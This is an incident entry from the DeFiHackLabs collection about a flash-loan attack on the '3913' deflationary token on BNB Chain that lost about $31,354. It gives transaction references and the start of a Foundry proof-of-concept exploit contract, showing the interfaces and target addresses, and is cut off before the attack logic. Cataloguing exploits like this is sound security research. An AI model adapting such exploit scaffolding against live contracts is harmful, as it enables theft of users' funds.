# [?] 3913Token - Deflationary Token Attack

## Summary
Severity: Unknown
Chain: BNB Chain
Component: 3913
Published: 2023-11-02
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/3913_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$31354 USD$
References:
- https://bscscan.com/tx/0x8163738d6610ca32f048ee9d30f4aa1ffdb3ca1eddf95c0eba086c3e936199ed
- https://defimon.xyz/attack/bsc/0x8163738d6610ca32f048ee9d30f4aa1ffdb3ca1eddf95c0eba086c3e936199ed

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~31,354 USD$
// Attacker : https://bscscan.com/tx/0xb29f18b89e56cc0151c7c17de0625a21018d8ae7
// Attack Contract : https://bscscan.com/address/0x783fbea45b32eaaa596b44412041dd1208025e83
// Attacker Transaction :
// https://bscscan.com/tx/0x8163738d6610ca32f048ee9d30f4aa1ffdb3ca1eddf95c0eba086c3e936199ed

// @Analysis
// https://defimon.xyz/attack/bsc/0x8163738d6610ca32f048ee9d30f4aa1ffdb3ca1eddf95c0eba086c3e936199ed

// The hacker sent multiple transactions to attack, just taking the first transaction as an example.

interface IDodo {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface I3913 is IERC20 {
    function burnPairs() external;
}

contract Exploit is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    I3913 vulnerable = I3913(0xd74F28c6E0E2c09881Ef2d9445F158833c174775);
    IPancakePair pair = IPancakePair(0x715762906489D5D671eA3eC285731975DA617583);
    IPancakePair pair3913to9419 = IPancakePair(0xd6d66e1993140966e6029815eDbB246800928969);
    IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    address dodo1 = 0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d;
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/3913_exp.sol_
